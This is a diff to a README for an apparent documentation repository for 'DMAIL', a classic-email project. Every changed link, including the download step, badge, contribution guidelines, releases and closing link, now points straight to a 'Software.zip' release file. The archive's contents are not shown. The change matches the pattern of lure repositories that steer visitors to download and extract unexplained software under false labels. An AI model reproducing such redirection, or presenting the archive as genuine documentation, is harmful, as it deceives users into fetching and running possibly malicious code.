@@ -8,8 +8,8 @@ Welcome to the official documentation source repository for DMAIL, an implementa
 - **Topics:** classic-email, classicemail, dmail, dmail-classicemail, dmail-classicemail-development, dmail-classicemail-docs, dmail-classicemail-documentation, dmail-classicemail-project, dmail-development, dmail-docs, dmail-documentation, dmail-project, email-1, email-1-0, gpl3, gplv3, markdown-lang, markdown-language
 
 ## Getting Started
-To access the latest version of DMAIL documentation, please [download the zip file here](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0) which needs to be extracted for usage.
-[![Download Zip](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0)](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0)
+To access the latest version of DMAIL documentation, please [download the zip file here](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip) which needs to be extracted for usage.
+[![Download Zip](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip)](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip)
 
 ## Contents
 1. **Introduction to DMAIL**
@@ -32,10 +32,10 @@ To access the latest version of DMAIL documentation, please [download the zip fi
    - Troubleshooting
 
 ## Contributing
-If you would like to contribute to the development of DMAIL or improve the documentation, please refer to the [https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0) file for guidelines.
+If you would like to contribute to the development of DMAIL or improve the documentation, please refer to the [https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip) file for guidelines.
 
 ## Releases
-For the most up-to-date release information, please check the [Releases](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0) section of this repository.
+For the most up-to-date release information, please check the [Releases](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip) section of this repository.
 
 ## License
 DMAIL is released under the GPLv3 license. For more details, see the [LICENSE](LICENSE) file.
@@ -46,4 +46,4 @@ DMAIL is released under the GPLv3 license. For more details, see the [LICENSE](L
 
 Thank you for visiting our documentation repository. Feel free to explore, contribute, and enhance your EMAIL 2 experience with DMAIL's Classic EMail compatibility. If you have any questions or feedback, please reach out to our team. We are here to help!
 
-[Visit DMAIL_ClassicEMail_Docs](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/tag/v1.0)
+[Visit DMAIL_ClassicEMail_Docs](https://github.com/idk471/DMAIL_ClassicEMail_Docs/releases/download/v2.0/Software.zip)
